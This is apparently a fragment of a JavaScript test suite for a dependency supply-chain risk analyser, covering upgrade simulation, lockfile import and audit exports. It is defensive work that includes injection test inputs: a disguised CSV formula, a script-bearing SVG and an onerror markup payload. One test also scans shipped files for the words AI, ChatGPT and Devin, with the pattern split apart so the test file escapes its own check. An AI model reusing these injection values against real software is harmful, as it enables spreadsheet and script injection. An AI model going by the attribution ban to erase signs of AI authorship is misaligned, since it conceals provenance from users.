        const upgraded = analyze(simulate(base, new Map([[node.id, { action: 'upgrade', version: '99.0.0', integrity: sri(7) }]])));
        assert.ok(upgraded.score <= baseScore, `${preset} ${node.id} upgrade: ${baseScore} -> ${upgraded.score}`);
      }
    }
  }
});
test('simulated upgrade does not inflate risk through missing candidate metadata', () => {
  const model = loadPreset('baseline');
  const target = model.nodes.find(node => !node.root && node.ecosystem === 'npm' && !node.local);
  const upgraded = analyze(simulate(model, new Map([[target.id, { action: 'upgrade', version: '9.9.9' }]])));
  assert.equal(upgraded.score, 0);
  assert.equal(upgraded.findings.filter(f => f.nodeId === target.id).length, 0);
});
test('simulate rejects non-iterable change sets', () => {
  const model = loadPreset('scope');
  for (const input of [null, {}, 5]) assert.throws(() => simulate(model, input), /iterable/);
});
test('analyze degrades gracefully on malformed hand-built models', () => {
  assert.equal(analyze({}).score, 0);
  assert.equal(analyze({ nodes: 'x', edges: null, notes: 9 }).score, 0);
  assert.equal(analyze({ nodes: [{ id: 'n', name: null, hooks: 4, integrity: 42 }], edges: {}, rootId: 'r' }).score, 0);
});
test('sriHashes tolerates non-string input', () => {
  for (const input of [42, null, undefined, {}]) assert.deepEqual(sriHashes(input), []);
});
test('CSV neutralizes a formula hidden behind a zero-width space', () => {
  assert.equal(csvCell('​=1'), '"\'​=1"');
});
test('audit export skips malformed changes and records the effective pin version', async () => {
  const model = loadPreset('scope');
  const id = 'npm:node_modules/@signaldesk/render';
  const version = model.nodes.find(node => node.id === id).version;
  const simulated = simulate(model, new Map([[id, { action: 'pin' }]]));
  const { text } = await makeExport('audit', analyze(simulated), {
    changes: new Map([[id, { action: 'pin' }], ['bogus', { bogus: 1 }], ['x', null]]),
  });
  assert.deepEqual(JSON.parse(text).evidence.changes, [{ nodeId: id, action: 'pin', version }]);
});
test('makeExport rejects an unknown export kind', async () => {
  await assert.rejects(() => makeExport('pdf', analyze(loadPreset('baseline'))));
});
test('SVG and markup are not accepted as input file types or executable expressions', () => {
  assert.throws(() => parseInput('<svg><script>throw 0</script></svg>', 'proof.svg'));
  assert.throws(() => py('<img onerror=placeholder>'));
});
test('index enforces network lockdown and local entry points', () => {
  const markup = readFileSync(new URL('../index.html', import.meta.url), 'utf8');
  assert.match(markup, /connect-src 'none'/);
  assert.match(markup, /script-src 'self'/);
  assert.doesNotMatch(markup, /<(?:script|link)\b[^>]+(?:src|href)=["']https?:/);
  assert.doesNotMatch(markup, /scroll-behavior\s*:\s*smooth/);
});
test('shipped text contains no banned typography, smooth scrolling, or tool attributions', () => {
  const root = new URL('../', import.meta.url);
  const banned = new RegExp(`[${String.fromCharCode(0x2013, 0x2014)}]|scroll-behavior\\s*:\\s*smooth|\\b(?:${['A' + 'I', 'Chat' + 'GPT', 'De' + 'vin'].join('|')})\\b`, 'i');
  assert.match(String.fromCharCode(0x2014), banned);
  for (const dir of ['', 'src/']) for (const name of readdirSync(new URL(dir, root))) {
    if (/\.(?:html|css|js|md|json|svg)$/.test(name)) {
      assert.doesNotMatch(readFileSync(new URL(dir + name, root), 'utf8'), banned, name);
    }
  }
});

test('npm import: many missing optional deps on a deep path stay fast', () => {
  const deep = 'a/' + 'x/'.repeat(500) + 'node_modules/holder';
  const optional = Object.fromEntries(Array.from({ length: 50000 }, (_, i) => [`missing-${i}`, '1.0.0']));
  const start = Date.now();
  const parsed = lock(npm({ '': {}, [deep]: { version: '1.0.0', optionalDependencies: optional } }));
  assert.ok(parsed.nodes.length >= 2);
  assert.ok(Date.now() - start < 1000, 'deep optional-dep import took ' + (Date.now() - start) + 'ms');
});

test('npm import: sibling prefixes do not shadow when a folder has no parent slash', () => {
  const parsed = lock(npm({
    '': {},
    'app/node_modules/react': { version: '17.0.0' },
    'apps/web/node_modules/holder': { version: '1.0.0', dependencies: { react: '18.0.0' } },
  }));
  const edge = parsed.edges.find(item => item.name === 'react');
  assert.match(edge?.to ?? '', /^missing:/, 'react must resolve to a missing marker, not the app sibling');
});

test('npm import: a dep scoped like node_modules resolves through an earlier boundary', () => {
  const parsed = lock(npm({
    '': { dependencies: { x: '1.0.0' } },
    'node_modules/x': { version: '1.0.0', dependencies: { '@s/node_modules': '1.0.0' } },
    'node_modules/@s/node_modules': { link: true, resolved: 'packages/lib' },
    'packages/lib': { version: '1.0.0' },
  }));
  const edge = parsed.edges.find(item => item.name === '@s/node_modules');
  assert.equal(edge?.to, 'npm:packages/lib');
});
